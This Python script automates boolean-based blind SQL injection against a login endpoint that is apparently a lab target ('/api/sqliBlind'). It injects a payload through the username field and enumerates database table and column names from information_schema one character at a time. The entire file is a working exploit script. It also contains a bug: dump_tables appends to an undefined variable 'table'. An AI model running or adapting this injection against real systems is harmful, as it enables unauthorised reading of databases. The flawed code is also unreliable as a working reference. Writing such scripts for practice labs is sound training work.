from numpy import character
import requests, string

characters = string.printable
s = requests.session()

target = "http://0.0.0.0/api/sqliBlind"

def get_one_char(payload):
    for c in characters:
        response = s.post(target,json = {
            'username' : f"a' or ({payload})={ord(c)}  -- -",
            'password' : 'foo'
            }).json()
        if response['data'] == True:
            return c
    return None

def dump_tables():
    tables = ""
    payload = "select ascii(mid(group_concat(table_name),{index},1)) from information_schema.tables where table_schema=database()"
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        tables, index = table + c , index + 1
        print('[+] table = ',tables)
        c = get_one_char(payload.format(index=index))
    return tables

def dump_columns(table_name):
    columns = ""
    payload = "select ascii(mid(group_concat(column_name),{index},1)) from information_schema.columns where table_name='%s'"%(table_name)
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        columns, index = columns + c, index + 1 
        c = get_one_char(payload.format(index=index))
    return columns

table = dump_tables()

print('\n-----------\n[*] tables found: ', table)

for t in table.split(','):
    print(f'[*] columns of {t} found: ',dump_columns(t))